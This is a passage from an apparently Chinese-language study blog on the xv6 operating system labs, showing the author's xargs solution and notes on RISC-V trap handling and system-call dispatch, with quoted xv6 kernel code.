class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_line_length</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> line_length=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(buf[line_length]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        line_length++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> line_length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> cur=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> line_num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;argv fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> size=read(<span class="number">0</span>,buf,<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">char</span> parm_buf[size+<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">memset</span>(parm_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(parm_buf));</span><br><span class="line">    cur++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size; i++,cur++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">            cur++;</span><br><span class="line">            parm_buf[cur]=<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            line_num++;</span><br><span class="line">            cur++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        parm_buf[cur]=buf[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(buf[size<span class="number">-1</span>]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        line_num++;</span><br><span class="line">    &#125;</span><br><span class="line">    cur=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;line_num;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> add_parm_num=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> temp_cur=cur;</span><br><span class="line">        <span class="keyword">for</span>(;parm_buf[temp_cur]!=<span class="string">&#x27;\n&#x27;</span>;temp_cur++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(parm_buf[temp_cur]==<span class="number">0</span>&amp;&amp;parm_buf[temp_cur+<span class="number">1</span>]!=<span class="number">0</span>&amp;&amp;parm_buf[temp_cur+<span class="number">1</span>]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">                add_parm_num++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> *parm[add_parm_num+argc];</span><br><span class="line">        <span class="built_in">memset</span>(parm,<span class="number">0</span>,<span class="keyword">sizeof</span>(parm));</span><br><span class="line">        <span class="keyword">int</span> parm_cur=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;argc;j++,parm_cur++)&#123;</span><br><span class="line">            parm[parm_cur]=argv[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(;parm_buf[cur]!=<span class="string">&#x27;\n&#x27;</span>;cur++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(parm_buf[cur]==<span class="number">0</span>&amp;&amp;parm_buf[cur+<span class="number">1</span>]!=<span class="number">0</span>&amp;&amp;parm_buf[cur+<span class="number">1</span>]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">                parm[parm_cur]=&amp;parm_buf[cur+<span class="number">1</span>];</span><br><span class="line">                parm_cur++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cur++;</span><br><span class="line">        <span class="keyword">int</span> pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">            exec(parm[<span class="number">0</span>],parm);</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;exec fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(status==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot; wait fail\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="最后lab得分"><a href="#最后lab得分" class="headerlink" title="最后lab得分"></a>最后lab得分</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Score: 100/100</span><br></pre></td></tr></table></figure>

<h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>在xv6操作系统上编程很奇妙也很有意思。</p>
<h3 id="Lab2-system-calls"><a href="#Lab2-system-calls" class="headerlink" title="Lab2: system calls"></a>Lab2: system calls</h3><p>这个实验主要是为了理解系统调用的工作流程，并为xv6增加一些新的系统调用。</p>
<h4 id="book-read-2"><a href="#book-read-2" class="headerlink" title="book-read"></a>book-read</h4><h5 id="trap"><a href="#trap" class="headerlink" title="trap"></a>trap</h5><p>有三种时间导致cpu搁置普通指令的执行，强制将控制权转移给处理该事件的特殊代码上，一种情况是系统调用使用<code>ecall</code>的时候，一种是异常，比如user/kernel指令做了一些非法的事情如除零，第三种是设备中断，这三种情况被统称为<code>trap</code>,xv6内核处理所有的trap.</p>
<h5 id="risc-v陷入机制"><a href="#risc-v陷入机制" class="headerlink" title="risc-v陷入机制"></a>risc-v陷入机制</h5><p>risc-v架构的cpu都有一组控制寄存器，kernel通过向这些寄存器写入内容来使cpu处理trap</p>
<p>下面是重要的寄存器</p>
<blockquote>
<p><code>stvec</code>:内核在这里写入trap处理程序的地址，risc-v跳转到这里处理trap</p>
<p><code>sepc</code>:当发生trap时，risc-v会保存原来<code>pc</code>的信息到<code>sepc</code>,<code>sret</code>(从陷阱返回)指令就会将<code>sepc</code>复制到<code>pc</code>,内核可以写入<code>sepc</code>来控制<code>sret</code>的去向。</p>
<p><code>scause</code>:risc-v在这里防止描述trap原因的数字</p>
<p><code>sscratch</code>:内核在这里放置一个值，这个值在trap处理程序一开始就会派上用场。</p>
<p><code>sstatus</code>:其中的<code>SIE</code>位控制设备中断是否启动，<code>SPP</code>位指示trap是来自user-mode还是kernel-mode,并控制<code>sret</code>返回的模式</p>
</blockquote>
<p>risc-v硬件对所有trap(除了计时器中断)执行以下操作</p>
<blockquote>
<ol>
<li>如果陷阱是设备中断，并且状态<strong>SIE</strong>位被清空，则不执行以下任何操作。</li>
<li>清除<strong>SIE</strong>以禁用中断。</li>
<li>将<code>pc</code>复制到<code>sepc</code>。</li>
<li>将当前模式（用户或管理）保存在状态的<strong>SPP</strong>位中。</li>
<li>设置<code>scause</code>以反映产生陷阱的原因。</li>
<li>将模式设置为管理模式。</li>
<li>将<code>stvec</code>复制到<code>pc</code>。</li>
<li>在新的<code>pc</code>上开始执行。</li>
</ol>
</blockquote>
<p>可见cpu硬件只会执行这些操作，当控制权给到内核的时候，得要内核自己完成对内核页表的切换，对内核栈的切换，然后进入对trap真正处理的函数上，对除了<code>pc</code>以外所有寄存器的保存。</p>
<h5 id="从用户空间陷入"><a href="#从用户空间陷入" class="headerlink" title="从用户空间陷入"></a>从用户空间陷入</h5><p><img src="http://xv6.dgs.zone/tranlate_books/book-riscv-rev1/images/c2/p2.png" alt="img"></p>
<p>总体分为四步调用，<code>uservec</code>,<code>usertrap</code>,<code>usertrapret</code>和<code>userret</code>。</p>
<p><strong>uservec</strong></p>
<p><code>uservec</code>代码处于<code>kernel/trampoline.S</code>中，一猜就是用汇编写的，因为控制单位到了寄存器量级，但是是risc-v捏，看不太懂。如上面所说，kernel-mode得完成那些操作才可以进入对trap真正处理的函数上（<code>usertrap</code>），而这些操作都被放置在<code>uservec</code>中，即刚开始的<code>stvec</code>指向了<code>uservec</code>,但是刚进入kernel-mode的时候<code>satp</code>并没有指向<code>kernel-page</code>,而是在<code>user-page</code>中，要想执行<code>uservec</code>则必须在用户页表中也映射上,在<code>uservec</code>中会切换<code>satp</code>以指向内核页表，所以为了在切换后继续执行指令，<code>uservec</code>必须在内核页表和用户页表中映射相同的地址。</p>
<p>为此xv6专门设置了一个页面放置<code>uservec</code>代码，然后把这个页面映射到内核页表和所有的用户页表中，且虚拟地址全部相同，这个虚拟地址就是上图的<code>trampoline</code>,在user-mode时stvec就指向了<code>trampoline</code>即<code>userevc</code>。</p>
<p>到这里我觉得十分合理，可能x86也是这样干的，当<code>userevc</code>启动的时候，所有的32个寄存器都保存着原来中断代码的值，不能够随意更改，但<code>userevc</code>需要能够使用一些寄存器才能完成他的功能，risc-v的<code>sscratch</code>就发挥了作用，<code>userevc</code>开始的时候通过指令<code>csrrw</code>交换了<code>a0</code>和<code>sscratch</code>的内容，此时<code>a0</code>寄存器的值就被保存了，<code>uservec</code>就可以使用<code>a0</code>寄存器了。</p>
<p>具体该怎么保存所有的寄存器的值，就牵扯到了另一个机制<code>陷阱帧</code>，如上图所示，陷阱帧就是<code>trapframe</code>,该帧有保存用户所有的寄存器的空间。此时<code>satp</code>还是指向了用户页表，所以要使用这个陷阱帧还得把他映射到用户页表中，<code>sscratch</code>就指向了这个陷阱帧，执行完<code>csrrw</code>后<code>a0</code>寄存器就指向了陷阱帧，然后<code>uservec</code>就利用a0把所有用户寄存器保存在陷阱帧，陷阱帧中还包含了指向当前进程内核栈的指针，当前cpu的<code>hartid</code>,<code>usertrap</code>的地址以及内核页表的地址，<code>uservec</code>就取得这些值，将<code>satp</code>切换到内核页表，并调用<code>usertrap</code>。</p>
<p><strong>usertrap</strong></p>
<p>下面是xv6 usertrap代码</p>
<p>代码比较清晰，首先会检查上一个模式是什么，然后设置<code>stvec</code>,因为此时cpu已经处于内核态了，当发生trap时得执行内核的<code>kernelvec</code>而不是<code>suervec</code>,所以会把<code>stvec</code>指向<code>kernelvec</code>,然后保存了sepc到p-&gt;trapframe-&gt;sepc中防止被覆盖，然后判断trap的类型，如果是系统调用<code>syscall()</code>会处理，如果是设备中断，<code>devintr</code>会处理他，否则就是一个异常，就设置<code>p-&gt;killed=1</code>,代表会被杀死，最后内核检查进程是否应该被杀死或者因为时钟中断让出cpu,最后调用<code>usertrapret</code>,流程比起<code>uservec</code>好理解多了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">usertrap</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((r_sstatus() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line">  <span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">  w_stvec((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// save user program counter.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = r_sepc();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line">    <span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// an interrupt will change sstatus &amp;c registers,</span></span><br><span class="line">    <span class="comment">// so don&#x27;t enable until done with those registers.</span></span><br><span class="line">    intr_on();</span><br><span class="line"></span><br><span class="line">    syscall();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = devintr()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// ok</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>usertrapret</strong></p>
<p>首先是获得进程的proc结构体，然后是<code>intr_off</code>设置了sstatus的<code>sie</code>位，然后是设置了<code>stvec</code>，因为要返回用户态了，所以trap处理程序变成了<code>uservec</code>,然后是在陷阱帧中记录内核页表地址，sp地址，<code>usertrap</code>地址，以及<code>hartid</code>。然后是设置sstatus的ssp位，把上一个模式设置为user-mode,然后是设置sepc得到用户态页表地址，然后又跳回<code>trampoline</code>中执行<code>userret</code>,至于为什么要把<code>userret</code>函数放置在<code>trampoline</code>中，是因为<code>userret</code>中会切换页表。要想切换完页表还能继续执行<code>userret</code>只能把他放在<code>trampoline</code>中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">usertrapret</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// we&#x27;re about to switch the destination of traps from</span></span><br><span class="line">  <span class="comment">// kerneltrap() to usertrap(), so turn off interrupts until</span></span><br><span class="line">  <span class="comment">// we&#x27;re back in user space, where usertrap() is correct.</span></span><br><span class="line">  intr_off();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send syscalls, interrupts, and exceptions to trampoline.S</span></span><br><span class="line">  w_stvec(TRAMPOLINE + (uservec - trampoline));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up trapframe values that uservec will need when</span></span><br><span class="line">  <span class="comment">// the process next re-enters the kernel.</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_satp = r_satp();         <span class="comment">// kernel page table</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; <span class="comment">// process&#x27;s kernel stack</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_trap = (uint64)usertrap;</span><br><span class="line">  p-&gt;trapframe-&gt;kernel_hartid = r_tp();         <span class="comment">// hartid for cpuid()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up the registers that trampoline.S&#x27;s sret will use</span></span><br><span class="line">  <span class="comment">// to get to user space.</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// set S Previous Privilege mode to User.</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> x = r_sstatus();</span><br><span class="line">  x &amp;= ~SSTATUS_SPP; <span class="comment">// clear SPP to 0 for user mode</span></span><br><span class="line">  x |= SSTATUS_SPIE; <span class="comment">// enable interrupts in user mode</span></span><br><span class="line">  w_sstatus(x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set S Exception Program Counter to the saved user pc.</span></span><br><span class="line">  w_sepc(p-&gt;trapframe-&gt;epc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// tell trampoline.S the user page table to switch to.</span></span><br><span class="line">  uint64 satp = MAKE_SATP(p-&gt;pagetable);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// jump to trampoline.S at the top of memory, which </span></span><br><span class="line">  <span class="comment">// switches to the user page table, restores user registers,</span></span><br><span class="line">  <span class="comment">// and switches to user mode with sret.</span></span><br><span class="line">  uint64 fn = TRAMPOLINE + (userret - trampoline);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(uint64,uint64))fn)(TRAPFRAME, satp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>userret</strong></p>
<p>a1保存的是用户态页表地址，a0保存的是<code>trampoline</code>地址，首先切换页表，然后从陷阱帧中恢复用户寄存器，最后调用<code>sret</code>完成对用户态的切换。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">.globl userret</span><br><span class="line">userret:</span><br><span class="line">        # userret(TRAPFRAME, pagetable)</span><br><span class="line">        # switch from kernel to user.</span><br><span class="line">        # usertrapret() calls here.</span><br><span class="line">        # a0: TRAPFRAME, in user page table.</span><br><span class="line">        # a1: user page table, for satp.</span><br><span class="line"></span><br><span class="line">        # switch to the user page table.</span><br><span class="line">        csrw satp, a1</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        # put the saved user a0 in sscratch, so we</span><br><span class="line">        # can swap it with our a0 (TRAPFRAME) in the last step.</span><br><span class="line">        ld t0, 112(a0)</span><br><span class="line">        csrw sscratch, t0</span><br><span class="line"></span><br><span class="line">        # restore all but a0 from TRAPFRAME</span><br><span class="line">        ld ra, 40(a0)</span><br><span class="line">        ld sp, 48(a0)</span><br><span class="line">        ld gp, 56(a0)</span><br><span class="line">        ld tp, 64(a0)</span><br><span class="line">        ld t0, 72(a0)</span><br><span class="line">        ld t1, 80(a0)</span><br><span class="line">        ld t2, 88(a0)</span><br><span class="line">        ld s0, 96(a0)</span><br><span class="line">        ld s1, 104(a0)</span><br><span class="line">        ld a1, 120(a0)</span><br><span class="line">        ld a2, 128(a0)</span><br><span class="line">        ld a3, 136(a0)</span><br><span class="line">        ld a4, 144(a0)</span><br><span class="line">        ld a5, 152(a0)</span><br><span class="line">        ld a6, 160(a0)</span><br><span class="line">        ld a7, 168(a0)</span><br><span class="line">        ld s2, 176(a0)</span><br><span class="line">        ld s3, 184(a0)</span><br><span class="line">        ld s4, 192(a0)</span><br><span class="line">        ld s5, 200(a0)</span><br><span class="line">        ld s6, 208(a0)</span><br><span class="line">        ld s7, 216(a0)</span><br><span class="line">        ld s8, 224(a0)</span><br><span class="line">        ld s9, 232(a0)</span><br><span class="line">        ld s10, 240(a0)</span><br><span class="line">        ld s11, 248(a0)</span><br><span class="line">        ld t3, 256(a0)</span><br><span class="line">        ld t4, 264(a0)</span><br><span class="line">        ld t5, 272(a0)</span><br><span class="line">        ld t6, 280(a0)</span><br><span class="line"></span><br><span class="line">	# restore user a0, and save TRAPFRAME in sscratch</span><br><span class="line">        csrrw a0, sscratch, a0</span><br><span class="line">        </span><br><span class="line">        # return to user mode and user pc.</span><br><span class="line">        # usertrapret() set up sstatus and sepc.</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure>

<p>借助从用户态的陷入终于理清了xv6的用户态和内核态的转换了，受益匪浅。</p>
<p><strong>调用系统调用</strong></p>
<p><code>syscall</code>代码如下，代码简略清晰，就以<code>exec</code>调用位例子，两个参数分别存放在a0,和a1中，然后把系统调用号放在a7中，系统调用号就是<code>syscall[]</code>的下标，寻找到的值就是该系统调用的处理函数，<code>exec</code>系统调用最后就会调用<code>sys_exec</code>。此时会有个疑问，系统调用都是有参数的，为什么最后的<code>p-&gt;trapframe-&gt;a0 = syscalls[num]();</code>没有呢，我大概看了<code>sys_exec</code>的代码，发现他是直接从陷阱帧中取寄存器值的，而不是传参。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="keyword">void</span>)</span> </span>= &#123;</span><br><span class="line">[SYS_fork]    sys_fork,</span><br><span class="line">[SYS_exit]    sys_exit,</span><br><span class="line">[SYS_wait]    sys_wait,</span><br><span class="line">[SYS_pipe]    sys_pipe,</span><br><span class="line">[SYS_read]    sys_read,</span><br><span class="line">[SYS_kill]    sys_kill,</span><br><span class="line">[SYS_exec]    sys_exec,</span><br><span class="line">[SYS_fstat]   sys_fstat,</span><br><span class="line">[SYS_chdir]   sys_chdir,</span><br><span class="line">[SYS_dup]     sys_dup,</span><br><span class="line">[SYS_getpid]  sys_getpid,</span><br><span class="line">[SYS_sbrk]    sys_sbrk,</span><br><span class="line">[SYS_sleep]   sys_sleep,</span><br><span class="line">[SYS_uptime]  sys_uptime,</span><br><span class="line">[SYS_open]    sys_open,</span><br><span class="line">[SYS_write]   sys_write,</span><br><span class="line">[SYS_mknod]   sys_mknod,</span><br><span class="line">[SYS_unlink]  sys_unlink,</span><br><span class="line">[SYS_link]    sys_link,</span><br><span class="line">[SYS_mkdir]   sys_mkdir,</span><br><span class="line">[SYS_close]   sys_close,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="系统调用参数"><a href="#系统调用参数" class="headerlink" title="系统调用参数"></a>系统调用参数</h5><p>好家伙，我刚有这个疑问，书的下一节就解释这个问题，牛啊。</p>
<p>系统提供三个函数artint,artaddr,artfd从陷阱帧中检索第<code>n</code>个系统调用参数并且以整数，指针，或者文件描述符的形式保存，他们都调用<code>argraw</code>来检索相应的保存的用户寄存器。比如<code>argstr</code>函数</p>
